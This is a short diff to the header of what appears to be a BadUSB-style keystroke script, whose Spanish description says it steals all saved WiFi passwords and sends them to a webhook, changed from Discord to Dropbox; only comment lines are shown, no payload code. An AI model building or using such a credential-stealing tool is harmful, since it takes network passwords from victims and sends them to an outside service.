@@ -1,5 +1,5 @@
 REM Author: DOLARASO
-REM Description: Roba todas las contraseñas Wifi guardadas y las envía a un webhook de discordia.
+REM Description: Roba todas las contraseñas Wifi guardadas y las envía a un webhook de dropbox.
 REM Version:	1.0
 REM Category:	Passwords
 
